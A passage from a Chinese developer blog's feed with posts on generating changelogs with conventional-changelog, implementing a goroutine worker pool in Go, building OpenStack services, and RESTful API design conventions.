<h3 id="validate-commit-msg校验工具"><a href="#validate-commit-msg校验工具" class="headerlink" title="validate-commit-msg校验工具"></a>validate-commit-msg校验工具</h3><p>validate-commit-msg 用于检查 Node 项目的 Commit message 是否符合格式。我暂时不需要,<a href="https://github.com/kentcdodds/validate-commit-msg" target="_blank" rel="external">github地址</a></p>
<h3 id="生成Change-log的工具"><a href="#生成Change-log的工具" class="headerlink" title="生成Change log的工具"></a>生成Change log的工具</h3><p>conventional-changelog 就是生成 Change log 的工具，运行下面的命令即可。<br>我已经使用setuptools的pbr来管理change log, 因此我咱不适用这个工具,关于<a href="http://docs.openstack.org/developer/pbr/" target="_blank" rel="external">pbr说明</a><br>如果是其他项目可以考虑这个工具<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">$ npm install -g conventional-changelog</div><div class="line">$ <span class="built_in">cd</span> my-project</div><div class="line">$ conventional-changelog -p angular -i CHANGELOG.md -w</div></pre></td></tr></table></figure></p>
<p>上面命令不会覆盖以前的 Change log，只会在CHANGELOG.md的头部加上自从上次发布以来的变动。<br>如果你想生成所有发布的 Change log，要改为运行下面的命令。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ conventional-changelog -p angular -i CHANGELOG.md -w -r 0</div></pre></td></tr></table></figure></p>
<p>为了方便使用，可以将其写入package.json的scripts字段。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">&#123;</div><div class="line">  <span class="string">"scripts"</span>: &#123;</div><div class="line">    <span class="string">"changelog"</span>: <span class="string">"conventional-changelog -p angular -i CHANGELOG.md -w -r 0"</span></div><div class="line">  &#125;&#125;</div></pre></td></tr></table></figure></p>
<p>以后，直接运行下面的命令即可。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ npm run changelog</div></pre></td></tr></table></figure></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;img src=&quot;http://oiw1gzfww.bkt.clouddn.com/angular-commit-message.png&quot; alt=&quot;&quot;&gt;&lt;br&gt;
    
    </summary>
    
      <category term="开发工具" scheme="https://blog.yumaojun.net/categories/%E5%BC%80%E5%8F%91%E5%B7%A5%E5%85%B7/"/>
    
      <category term="git" scheme="https://blog.yumaojun.net/categories/%E5%BC%80%E5%8F%91%E5%B7%A5%E5%85%B7/git/"/>
    
    
  </entry>
  
  <entry>
    <title>Golang并发编程-协程池</title>
    <link href="https://blog.yumaojun.net/2017/01/12/goroutine-pool/"/>
    <id>https://blog.yumaojun.net/2017/01/12/goroutine-pool/</id>
    <published>2017-01-12T13:29:14.000Z</published>
    <updated>2017-01-15T05:37:04.000Z</updated>
    
    <content type="html"><![CDATA[<p>在最近开发的项目中，后端需要编写许多提供HTTP接口的API，之所以选择Golang，主要是考虑到开发的模块，都需要接受瞬时大并发、、CPU密集型的分析任务、处理时间较长、无法同步立即返回结果的场景，Golang的goroutine以及channel所提供的语言层级的特性，正好可以满足这方面的需要<br><a id="more"></a></p>
<h2 id="如何高并发"><a href="#如何高并发" class="headerlink" title="如何高并发"></a>如何高并发</h2><p>并发模式下有很多问题需要我们关注, 因此我们设计出来的goroutine pool应该关注如下一些问题</p>
<h3 id="goroutine的高并发"><a href="#goroutine的高并发" class="headerlink" title="goroutine的高并发"></a>goroutine的高并发</h3><p><code>goroutine</code>的一个主要特性就是它们的消耗；创建它们的初始内存成本很低(与需要1至8MB内存的传统<code>POSIX</code>线程形成鲜明对比)以及根据需要动态增长和缩减占用的资源。这使得<code>goroutine</code>会从<code>4096</code>字节的初始栈内存占用开始按需增长或缩减内存占用, 在一般的需求下, 我们无需担心资源的耗尽。</p>
<p>Go语言通过系统的线程来多路派遣这些函数的执行，使得每个用go关键字执行的函数可以运行成为一个单位协程。当一个协程阻塞的时候，调度器就会自动把其他协程安排到另外的线程中去执行，从而实现了程序无等待并行化运行。而且调度的开销非常小，一颗CPU调度的规模不下于每秒百万次，这使得我们能够创建大量的<code>goroutine</code>，从而可以很轻松地编写高并发程序，达到我们想要的目的</p>
<p>简单来说：协程十分轻量，可以在一个进程中执行有数以十万计的协程，依旧保持高性能。</p>
<p>因此我们使用<code>goroutine</code>处理任务, 大概模型为：<br><figure class="highlight golang"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">package</span> main</div><div class="line"></div><div class="line"><span class="keyword">import</span> (</div><div class="line">	<span class="string">"fmt"</span></div><div class="line">	<span class="string">"time"</span></div><div class="line">)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">func</span> <span class="title">say</span><span class="params">(s <span class="keyword">string</span>)</span></span> &#123;</div><div class="line">	fmt.Println(s)</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</div><div class="line">	<span class="keyword">for</span> _, word := <span class="keyword">range</span> []<span class="keyword">string</span>&#123;<span class="string">"hello"</span>, <span class="string">"world"</span>, <span class="string">"this"</span>, <span class="string">"is"</span>, <span class="string">"my"</span>, <span class="string">"goroutine"</span>, <span class="string">"test"</span>&#125; &#123;</div><div class="line">		<span class="keyword">go</span> say(word) <span class="comment">//开一个新的Goroutines执行</span></div><div class="line">	&#125;</div><div class="line">	time.Sleep(time.Second * <span class="number">1</span>) <span class="comment">// 等待goroutine跑完, 我为了方便使用了sleep的方式</span></div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<h3 id="利用协序池做并发控制"><a href="#利用协序池做并发控制" class="headerlink" title="利用协序池做并发控制"></a>利用协序池做并发控制</h3><p>虽然goroutine很便宜, 但也不是免费的, 总有一个时候你系统会扛不住，我们不能天真的对goroutine的数量不加限制的使用, 因此我们需要一种并发的限制机制来保证程序的稳定, 使得程序不会因为过多的goroutine而崩溃, 至于多少个goroutine 就需要根据自己环境测试得出。</p>
<p>如何对goroutine做并发限制喃？使用Java和C概念中的线程池来处理是个不错的方法，我们会使用Channel实现Queue+Worker模型, 整个过程：将请求都转发给一个channel，然后初始化多个goroutine读取这个channel中的内容，并进行处</p>
<h3 id="避免接收Channel阻塞"><a href="#避免接收Channel阻塞" class="headerlink" title="避免接收Channel阻塞"></a>避免接收Channel阻塞</h3><p>如果channel初始化时是没有设置长度的，此时如果协序池都满负荷工作，再有请求过来的话，仍然会出现被block的情况，而且会比没有经过优化的方案还要慢</p>
<p>遇到这种情况，我们应该希望模块能够及时告知调用方，“我已经达到处理极限了，无法给你处理请求了”。其实，这种需求，可以很简单的在Golang中实现：如果channel发送以及接收操作在select语句中执行并且发生阻塞，default语句就会立即执行。</p>
<h3 id="接收执行结果"><a href="#接收执行结果" class="headerlink" title="接收执行结果"></a>接收执行结果</h3><p>我们既需要把结果发送给某个channel，获取到处理这次请求的结果。解决的方法是：将一个channel实例包含在请求中，goroutine处理完成后将结果写回这个channel</p>
<h3 id="任务超时机制"><a href="#任务超时机制" class="headerlink" title="任务超时机制"></a>任务超时机制</h3><p>即使是复杂、耗时的任务，也必须设置超时时间。一方面可能是业务对此有时限要求（用户必须在XX分钟内看到结果），另一方面模块本身也不能都消耗在一直无法结束的任务上，使得其他请求无法得到正常处理。因此，也需要对处理流程增加超时机制。</p>
<p>我一般设置超时的方案是：和之前提到的“接收发送给channel之后返回的结果”结合起来，在等待返回channel的外层添加select，并在其中通过time.After()来判断超时</p>
<h3 id="协程的优雅退出"><a href="#协程的优雅退出" class="headerlink" title="协程的优雅退出"></a>协程的优雅退出</h3><p>协序池里面的协序我们也需要优雅退出，解决方法很简单, 直接通过select监听一个退出channel, 等待外部通知, 好终止协程</p>
<h2 id="实现协程池"><a href="#实现协程池" class="headerlink" title="实现协程池"></a>实现协程池</h2><p>接下里我们将实现一个满足上述需求的Goroutine pool</p>
<h3 id="流程图"><a href="#流程图" class="headerlink" title="流程图"></a>流程图</h3><p><img src="http://oiw1gzfww.bkt.clouddn.com/goroutine-pool.png" alt=""></p>
<h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><figure class="highlight golang"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">package</span> main</div><div class="line"></div><div class="line"><span class="keyword">import</span> <span class="string">"os"</span></div><div class="line"></div><div class="line"><span class="keyword">var</span> (</div><div class="line">	<span class="comment">// MaxWorker is the number of goroutine worker to start</span></div><div class="line">	MaxWorker = os.Getenv(<span class="string">"MAX_WORKERS"</span>)</div><div class="line">	<span class="comment">// MaxQueue is the job Queue buffered lenth</span></div><div class="line">	MaxQueue = os.Getenv(<span class="string">"MAX_QUEUE"</span>)</div><div class="line">	<span class="comment">// JobQueue is a buffered channel that we can send work requests on.</span></div><div class="line">	JobQueue <span class="keyword">chan</span> Job</div><div class="line">	<span class="comment">// WorkerPool is a pool of workers that are instantianted to perform the work</span></div><div class="line">	WorkerPool <span class="keyword">chan</span> <span class="keyword">chan</span> Job</div><div class="line">)</div><div class="line"></div><div class="line"><span class="comment">// Job represents the job to be run</span></div><div class="line"><span class="keyword">type</span> Job <span class="keyword">struct</span> &#123;</div><div class="line">	ID   <span class="keyword">int</span></div><div class="line">	task <span class="function"><span class="keyword">func</span><span class="params">()</span></span></div><div class="line">&#125;</div><div class="line"></div><div class="line">// <span class="title">Worker</span> <span class="title">represents</span> <span class="title">the</span> <span class="title">worker</span> <span class="title">that</span> <span class="title">executes</span> <span class="title">the</span> <span class="title">job</span></div><div class="line"><span class="title">type</span> <span class="title">Worker</span> <span class="title">struct</span> &#123;</div><div class="line">	ID          <span class="keyword">int</span></div><div class="line">	InputQueue  <span class="keyword">chan</span> Job</div><div class="line">	OutputQueue <span class="keyword">chan</span> Result</div><div class="line">	QuitQueue   <span class="keyword">chan</span> <span class="keyword">bool</span></div><div class="line">	WorkerPool  <span class="keyword">chan</span> <span class="keyword">chan</span> Job</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">// Result use to collect the task result</span></div><div class="line"><span class="keyword">type</span> Result <span class="keyword">struct</span> &#123;</div><div class="line">	JobID <span class="keyword">int</span></div><div class="line">	Data  <span class="keyword">interface</span>&#123;&#125;</div><div class="line">	Err   error</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">// GoroutinePool is a pool of workers channels that are registered with the GoroutinePool</span></div><div class="line"><span class="keyword">type</span> GoroutinePool <span class="keyword">struct</span> &#123;</div><div class="line">	maxWorkers  <span class="keyword">int</span></div><div class="line">	maxQueue    <span class="keyword">int</span></div><div class="line">	JobQueue    <span class="keyword">chan</span> Job</div><div class="line">	ResultQueue <span class="keyword">chan</span> Result</div><div class="line">	WorkerPool  <span class="keyword">chan</span> <span class="keyword">chan</span> Job</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">// NewWorker is factory function to new a worker</span></div><div class="line"><span class="function"><span class="keyword">func</span> <span class="title">NewWorker</span><span class="params">(id <span class="keyword">int</span>, workerPool <span class="keyword">chan</span> <span class="keyword">chan</span> Job)</span> *<span class="title">Worker</span></span> &#123;</div><div class="line">	worker := Worker&#123;</div><div class="line">		ID:          id,</div><div class="line">		InputQueue:  <span class="built_in">make</span>(<span class="keyword">chan</span> Job),</div><div class="line">		OutputQueue: <span class="built_in">make</span>(<span class="keyword">chan</span> Result),</div><div class="line">		WorkerPool:  workerPool,</div><div class="line">		QuitQueue:   <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="keyword">bool</span>),</div><div class="line">	&#125;</div><div class="line">	<span class="keyword">return</span> &amp;worker</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">// Start method starts the run loop for the worker, listening for a quit channel</span></div><div class="line"><span class="comment">// in case we need to stop it</span></div><div class="line"><span class="function"><span class="keyword">func</span> <span class="params">(w Worker)</span> <span class="title">Start</span><span class="params">()</span></span> &#123;</div><div class="line">	<span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</div><div class="line">		<span class="keyword">for</span> &#123;</div><div class="line">			<span class="comment">// register the current worker into the worker queue.</span></div><div class="line">			w.WorkerPool &lt;- w.InputQueue</div><div class="line"></div><div class="line">			<span class="keyword">select</span> &#123;</div><div class="line">			<span class="comment">// we have received a work request</span></div><div class="line">			<span class="keyword">case</span> job := &lt;-w.InputQueue:</div><div class="line">				job.task()</div><div class="line">			<span class="comment">// we have received a signal to stop</span></div><div class="line">			<span class="keyword">case</span> &lt;-w.QuitQueue:</div><div class="line">				<span class="keyword">return</span></div><div class="line">			&#125;</div><div class="line">		&#125;</div><div class="line">	&#125;()</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">// Stop signals the worker to stop listening for work requests.</span></div><div class="line"><span class="function"><span class="keyword">func</span> <span class="params">(w Worker)</span> <span class="title">Stop</span><span class="params">()</span></span> &#123;</div><div class="line">	<span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</div><div class="line">		w.QuitQueue &lt;- <span class="literal">true</span></div><div class="line">	&#125;()</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">// NewGoroutinePool is a factory function to new a GoroutinePool</span></div><div class="line"><span class="function"><span class="keyword">func</span> <span class="title">NewGoroutinePool</span><span class="params">(maxWorkers <span class="keyword">int</span>, maxQueue <span class="keyword">int</span>)</span> *<span class="title">GoroutinePool</span></span> &#123;</div><div class="line">	<span class="keyword">return</span> &amp;GoroutinePool&#123;</div><div class="line">		WorkerPool:  <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="keyword">chan</span> Job, maxWorkers),</div><div class="line">		JobQueue:    <span class="built_in">make</span>(<span class="keyword">chan</span> Job, maxQueue),</div><div class="line">		ResultQueue: <span class="built_in">make</span>(<span class="keyword">chan</span> Result, maxQueue),</div><div class="line">		maxWorkers:  maxWorkers,</div><div class="line">		maxQueue:    maxQueue,</div><div class="line">	&#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">// dispatch use to dispatch the job</span></div><div class="line"><span class="function"><span class="keyword">func</span> <span class="params">(d *GoroutinePool)</span> <span class="title">dispatch</span><span class="params">()</span></span> &#123;</div><div class="line">	<span class="keyword">for</span> &#123;</div><div class="line">		<span class="keyword">select</span> &#123;</div><div class="line">		<span class="keyword">case</span> job := &lt;-d.JobQueue:</div><div class="line">			<span class="comment">// a job request has benn received</span></div><div class="line">			<span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">(job Job)</span></span> &#123;</div><div class="line">				<span class="comment">// try to obtain a worker job channel that is available.</span></div><div class="line">				<span class="comment">// this will block until a worker is idle</span></div><div class="line">				jobChan := &lt;-d.WorkerPool</div><div class="line"></div><div class="line">				<span class="comment">// dispatch the job to the worker jobChan</span></div><div class="line">				jobChan &lt;- job</div><div class="line">			&#125;(job)</div><div class="line">		&#125;</div><div class="line">	&#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">// Run use to starting n number os workers</span></div><div class="line"><span class="function"><span class="keyword">func</span> <span class="params">(d *GoroutinePool)</span> <span class="title">Run</span><span class="params">()</span></span> &#123;</div><div class="line">	<span class="keyword">for</span> i := <span class="number">0</span>; i &lt; d.maxWorkers; i++ &#123;</div><div class="line">		worker := NewWorker(i+<span class="number">1</span>, d.WorkerPool)</div><div class="line">		worker.Start()</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	<span class="keyword">go</span> d.dispatch()</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">// AddJob is a method to add job to job channel</span></div><div class="line"><span class="function"><span class="keyword">func</span> <span class="params">(d *GoroutinePool)</span> <span class="title">AddJob</span><span class="params">(job Job)</span> <span class="params">(msg <span class="keyword">string</span>, err error)</span></span> &#123;</div><div class="line">	JobQueue &lt;- job</div><div class="line">	<span class="keyword">return</span> <span class="string">"add a job to Job queue"</span>, <span class="literal">nil</span></div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h3 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h3>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;在最近开发的项目中，后端需要编写许多提供HTTP接口的API，之所以选择Golang，主要是考虑到开发的模块，都需要接受瞬时大并发、、CPU密集型的分析任务、处理时间较长、无法同步立即返回结果的场景，Golang的goroutine以及channel所提供的语言层级的特性，正好可以满足这方面的需要&lt;br&gt;
    
    </summary>
    
      <category term="开发语言" scheme="https://blog.yumaojun.net/categories/%E5%BC%80%E5%8F%91%E8%AF%AD%E8%A8%80/"/>
    
      <category term="Golang" scheme="https://blog.yumaojun.net/categories/%E5%BC%80%E5%8F%91%E8%AF%AD%E8%A8%80/Golang/"/>
    
    
      <category term="goroutine" scheme="https://blog.yumaojun.net/tags/goroutine/"/>
    
  </entry>
  
  <entry>
    <title>如何开发Openstack服务-开篇(一)</title>
    <link href="https://blog.yumaojun.net/2017/01/10/develop-openstack-service/"/>
    <id>https://blog.yumaojun.net/2017/01/10/develop-openstack-service/</id>
    <published>2017-01-10T14:06:53.000Z</published>
    <updated>2017-01-12T07:31:06.000Z</updated>
    
    <content type="html"><![CDATA[<p><img src="http://oiw1gzfww.bkt.clouddn.com/openstack.develop.png" alt=""><br><a id="more"></a></p>
<p>openstack是我见过最大最复杂的python项目, 虽然openstack项目的热度在下滑, 但是openstack这套开发理念任然是相当不错的，值得我们学习. 由于工作需要, 我也需要开发一些自定义的openstack服务, 因此想将开发openstack服务的过程以一系列的文章记录下来, 方便需要的人。</p>
<h2 id="openstack简介"><a href="#openstack简介" class="headerlink" title="openstack简介"></a>openstack简介</h2><p>openstack是一个IaaS平台, 提供计算服务、网络服务、存储服务等, 有3种方式使用openstack提供的服务</p>
<ul>
<li>API<br>通过API使用OpenStack的方式是由各个服务自己实现的, 这些API都是有统一的形式的，都是采用了HTTP协议实现的符合REST规范的API。</li>
<li>CLI/SDK<br>通过命令行是用OpenStack服务的方式是由一系列项目来提供的，这些项目一般都命名为python-projectclient，比如python-keystoneclient，python-novaclietn等。这些命令行项目分别对应到各个主要的服务，为用户提供命令行操作界面和Python的SDK。比如python-keystoneclient对应到keystone，为用户提供了keystone这个命令，同时也提供了keyston项目的SDK（其实是在SDK的基础上实现了命令行）。这些client项目提供的SDK其实也是封装了对各自服务的API的调用。由于每个主要项目都有一个自己的命令行工具，社区觉得不好，于是又有了一个新的项目python-openstackclient，用来提供一个统一的命令行工具openstack（命令的名字就叫做openstack），这个工具实现了命令行，然后使用各个服务的client项目提供的SDK来完成对应的操作</li>
<li>WebUI<br>通过Web界面使用OpenStack服务这种方式是通过OpenStack的Horizon项目提供的。Horizon项目是一个Django应用，实现了一个面板功能，是传统的MVC开发模型, 不过最新的项目 在慢慢往Angular上迁移。Horizon项目主要是提供一种交互界面，它会通过API来和各个OpenStack服务进行交互，然后在Web界面上展示各个服务的状态；它也会接收用户的操作，然后调用各个服务的API来完成用户对各个服务的使用</li>
</ul>
<p>因此开发一个完整的openstack项目需要完成上面介绍的3部分的开发，当然API服务是根本。</p>
<h2 id="openstack架构"><a href="#openstack架构" class="headerlink" title="openstack架构"></a>openstack架构</h2><p>整个openstack的服务是以插件化得方式进行独立开发, 然后通过API相互关联, 比如:<br><img src="http://oiw1gzfww.bkt.clouddn.com/openstack-conceptual-arch-folsom.jpg" alt=""><br>接下来我们会以demo的形式开发一个和openstack服务类似的服务，该服务的名称就叫demo</p>
<h2 id="openstack中的api服务"><a href="#openstack中的api服务" class="headerlink" title="openstack中的api服务"></a>openstack中的api服务</h2><p>openstack的API设计风格为RESTful, 如何设计RESTful API我在前面的博客中有介绍, Python的Web开发框架很多，基本上，还活跃的框架都支持<code>RESTful API</code>的开发, 有些框架还专门为<code>RESTful API</code>的开发提供了便利的功能,比如<code>Pecan</code>，有些框架则通过第三方模块来提供这种便利，比如<code>Django</code>和<code>Flask</code>都有不少和REST相关的第三方库。<br>对于框架选择，也没有什么特别好的标准，一般都是比较性能、文档、社区是否活跃等。在我看来，选择流行的一般就不会错<br>下面是openstack keystone关于credential的API:<br><img src="http://oiw1gzfww.bkt.clouddn.com/openstack-restful-api.png" alt=""></p>
<h3 id="早期项目的api服务"><a href="#早期项目的api服务" class="headerlink" title="早期项目的api服务"></a>早期项目的api服务</h3><p>OpenStack项目倾向于不重新发明轮子，一般都会选择现有的库和框架来使用，除非现有的框架不满足需求。因为Web框架的选择很多，而且都满足需求，所以OpenStack项目到目前为止都是使用现成的Web框架。<br>OpenStack早期的项目并没有使用一个框架，而是使用了几个不同的模块来组合出一个框架：Paste + PasteDeploy + Routes + WebOb，这几个不同的模块分别负责应用的WSGI化、URL路由和请求处理等功能。Nova, Glance, Neutron, Keystone等早期的项目都是使用这样的架构来实现RESTful API的。<br>早期的这种技术选型带来的好处是”框架”具备足够的灵活性，缺点则是要把这几个模块组合起来实现一个REST服务，需要写很多代码，连WSGI的入口函数都要自己实现（比如Keystone项目的keystone/common/wsgi.py文件中的class Application）。因为灵活性的好处不是很明显，而代码量大的坏处很明显，比如上面那个class Application需要在每个项目中复制一遍，所以社区的新项目就开始使用新的Web框架Pecan</p>
<h3 id="新项目的api服务"><a href="#新项目的api服务" class="headerlink" title="新项目的api服务"></a>新项目的api服务</h3><p>Pecan是一个基于对象路由的框架，即灵活又简单。Pecan主要实现了URL路由功能，支持RESTful API。Pecan没有实现模板、session管理和ORM等功能，但是这些功能可以通过其他的模块来实现。对于OpenStack来说，Pecan是一个很好的选择，因为OpenStack项目中统一使用sqlalchemy来实现ORM，API的实现也不需要模板功能，安全控制则基于Keystone体系。使用Pecan来开发REST服务，代码量很少，代码结构也清晰。Ceilometer项目就是使用了Pecan</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;img src=&quot;http://oiw1gzfww.bkt.clouddn.com/openstack.develop.png&quot; alt=&quot;&quot;&gt;&lt;br&gt;
    
    </summary>
    
      <category term="开发语言" scheme="https://blog.yumaojun.net/categories/%E5%BC%80%E5%8F%91%E8%AF%AD%E8%A8%80/"/>
    
      <category term="Python" scheme="https://blog.yumaojun.net/categories/%E5%BC%80%E5%8F%91%E8%AF%AD%E8%A8%80/Python/"/>
    
    
      <category term="openstack" scheme="https://blog.yumaojun.net/tags/openstack/"/>
    
  </entry>
  
  <entry>
    <title>RESTful API 设计规范</title>
    <link href="https://blog.yumaojun.net/2017/01/06/rest-api-design/"/>
    <id>https://blog.yumaojun.net/2017/01/06/rest-api-design/</id>
    <published>2017-01-06T04:32:55.000Z</published>
    <updated>2017-01-06T04:38:40.000Z</updated>
    
    <content type="html"><![CDATA[<p><img src="http://oiw1gzfww.bkt.clouddn.com/rest_api.jpg" alt=""></p>
<a id="more"></a>
<p>做出一个好的API设计很难。API表达的是你的数据和你的数据使用者之间的契约，因此API的设计往往是站在使用者的角度进行的，而关于RESTful的介绍可以参考阮一峰的博客<a href="http://www.ruanyifeng.com/blog/2011/09/restful.html" target="_blank" rel="external">理解RESTful架构
</a>, 这里同时也参考了他的另一篇博客<a href="http://www.ruanyifeng.com/blog/2014/05/restful_api.html" target="_blank" rel="external">RESTful API 设计指南</a>在这方面有一篇很出名的文章，这里需要你自己解决翻墙问题<a href="https://codeplanet.io/principles-good-restful-api-design/" target="_blank" rel="external">Principles of good RESTful API Design</a></p>
<h2 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h2><p>   这里有一些非常重要的术语，我将在本文里面一直用到它们</p>
<ul>
<li>资源(Resource)：一个对象的单独实例，如一只动物</li>
<li>集合(Collection)：一群同种对象，如动物</li>
<li>HTTP：跨网络的通信协议</li>
<li>客户端(Consumer)：可以创建HTTP请求的客户端应用程序</li>
<li>第三方开发者(Third Party Developer)：这个开发者不属于你的项目但是有想使用你的数据</li>
<li>服务器(Server)：一个HTTP服务器或者应用程序，客户端可以跨网络访问它</li>
<li>端点(Endpoint)：这个API在服务器上的URL用于表达一个资源或者一个集合</li>
<li>幂等(Idempotent)：无边际效应，多次操作得到相同的结果</li>
<li>URL段(Segment)：在URL里面已斜杠分隔的内容</li>
</ul>
<h2 id="数据设计与抽象"><a href="#数据设计与抽象" class="headerlink" title="数据设计与抽象"></a>数据设计与抽象</h2><ul>
<li><p>理清业务数据流程</p>
<p>  规划好你的API的外观要先于开发它实际的功能。首先你要知道数据该如何设计和核心服务/应用程序会如何工作, 这部分的工作<br>  往往就是需要写好 PRD和DRD这些功能文档</p>
</li>
<li><p>站在使用者的角度进行合理抽象</p>
<p>  有时候一个集合可以表达一个数据库表，而一个资源可以表达成里面的一行记录，但是这并不是常态。事实上，你的API应该尽可能<br>  通过抽象来分离数据与业务逻辑。这点非常重要，只有这样做你才不会打击到那些拥有复杂业务的第三方开发者，<br>  否则他们是不会使用你的API的。</p>
</li>
<li><p>如何开放API</p>
<p>  当然你的服务可能很多部分是不应该通过API暴露出去的。比较常见的例子就是很多API是不允许第三方来创建用户的。</p>
</li>
</ul>
<h2 id="HTTP-动词"><a href="#HTTP-动词" class="headerlink" title="HTTP 动词"></a>HTTP 动词</h2><p>一个好的RESTful API只允许第三方调用者使用这四个半HTTP动词进行数据交互，并且在URL段里面不出现任何其他的动词。<br>一般来说，GET请求可以被浏览器缓存（通常也是这样的）。例如，缓存请求头用于第二次用户的POST请求。<br>HEAD请求是基于一个无响应体的GET请求，并且也可以被缓存的。</p>
<ul>
<li>GET (选择)：从服务器上获取一个具体的资源或者一个资源列表。</li>
<li>POST （创建）： 在服务器上创建一个新的资源。</li>
<li>PUT （更新）：以整体的方式更新服务器上的一个资源。</li>
<li>PATCH （更新）：只更新服务器上一个资源的一个属性。</li>
<li>DELETE （删除）：删除服务器上的一个资源。</li>
<li>HEAD ： 获取一个资源的元数据，如数据的哈希值或最后的更新时间。</li>
<li>OPTIONS：获取客户端能对资源做什么操作的信息。</li>
</ul>
<h2 id="域名"><a href="#域名" class="headerlink" title="域名"></a>域名</h2><p>  域名是用于访问你的API服务的第一步，因此如何在域名上表现自己提供的API 服务喃，以下有2种方法</p>
<ul>
<li><p>应该尽量将API部署在专用域名之下。</p>
</li>
<li><p>如果确定API很简单，不会有进一步扩展，可以考虑放在主域名下。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">https://api.example.com   # 专业域名</div><div class="line">https://example.org/api/  # URI中明确说明</div></pre></td></tr></table></figure>
</li>
</ul>
<h2 id="版本化"><a href="#版本化" class="headerlink" title="版本化"></a>版本化</h2><p>  API是服务器与客户端之间的一个公共契约。如果你对服务器上的API做了一个更改，并且这些更改无法向后兼容，<br>  那么你就打破了这个契约，客户端又会要求你重新支持它。为了避免这样的事情，你既要确保应用程序逐步的演变，<br>  又要让客户端满意。那么你必须在引入新版本API的同时保持旧版本API仍然可用。</p>
<p>  随着时间的推移，你可能声明不再支持某些旧版本的API。申明不支持一个特性并不意味着关闭或者破坏它。<br>  而是告诉客户端旧版本的API将在某个特定的时间被删除，并且建议他们使用新版本的API。</p>
